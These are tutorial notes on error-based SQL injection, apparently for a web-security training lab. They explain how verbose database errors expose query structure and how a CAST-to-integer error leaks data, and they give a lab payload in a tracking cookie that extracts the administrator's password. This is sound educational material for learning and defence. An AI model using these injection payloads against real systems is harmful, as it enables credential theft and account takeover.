# Extracting sensitive data via verbose SQL error messages

When a database is misconfigured to return **verbose error messages**, those messages can leak the query structure — or the query's **actual data** — turning a blind SQL injection into a visible one.

> Part of [Error-based SQL injection](Error-based-SQL-injection.md).

---

**Table of contents**

- [In plain English](#in-plain-english)
- [Verbose errors leak the query structure](#verbose-errors-leak-the-query-structure)
- [Making the error carry the data: CAST()](#making-the-error-carry-the-data-cast)
- [Lab: visible error-based SQL injection](#lab-visible-error-based-sql-injection)

---

## In plain English

| Topic | The idea | Takeaway |
| --- | --- | --- |
| **Verbose errors** | A chatty error message reveals the query — or the data — for free | A misconfigured database that prints full errors is **handing you a window into itself**: first the exact query shape, then, with a deliberate type-conversion error, the secret data printed right there in the error text. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> these are a lookup sheet, not something to memorise. Remember the one-line hook above; come back here for the exact <code>CAST</code> trick.
</div>

---

## Verbose errors leak the query structure

Injecting a single quote into an `id` parameter might produce a message like:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This reveals the **full query** the application built from your input. Here you can see:

- you're injecting into a **single-quoted string** inside a `WHERE` clause, and
- your extra quote broke the syntax.

Knowing the exact structure makes it far easier to craft a valid malicious payload — and **commenting out the rest of the query** (`--`) prevents your closing quote from breaking the syntax.

---

## Making the error carry the data: CAST()

Sometimes you can induce an error whose text **contains data returned by the query**, which turns a blind vulnerability into a visible one. The `CAST()` function converts one data type to another:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

The data you want is usually a **string**. Converting a string to an incompatible type like `int` fails, and the error echoes the offending value:

```
ERROR: invalid input syntax for type integer: "Example data"
```

The string you were trying to read (`Example data`) appears **inside the error message** — you've extracted it directly.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Handy under length limits:</strong> this technique is also useful when a <strong>character limit</strong> stops you from setting up conditional responses — a single <code>CAST</code> payload can leak a whole value at once, instead of one boolean per request.
</div>

---

## Lab: visible error-based SQL injection

> **PRACTITIONER** — Visible error-based SQL injection.

**Goal:** a tracking cookie feeds an injectable query; results aren't returned. There's a `users` table with `username` and `password` columns. Leak the `administrator` password and log in.

**Approach:**

1. **Break the query** with a single quote to surface a verbose error and learn the query shape:

   ```
   TrackingId=xyz'
   ```
2. **Trigger a type-conversion error that carries the data.** Cast the password to an int so the value lands in the error text:

   ```sql
   xyz' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)=1--
   ```

   The response returns something like:

   ```
   ERROR: invalid input syntax for type integer: "a1b2c3d4e5..."
   ```
3. **Read the password** from the error message and log in as `administrator`.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why the whole value leaks at once:</strong> unlike the conditional techniques (one bit per request), <code>CAST</code> forces the database to print the entire string it failed to convert — so a single request reveals the full password.
</div>
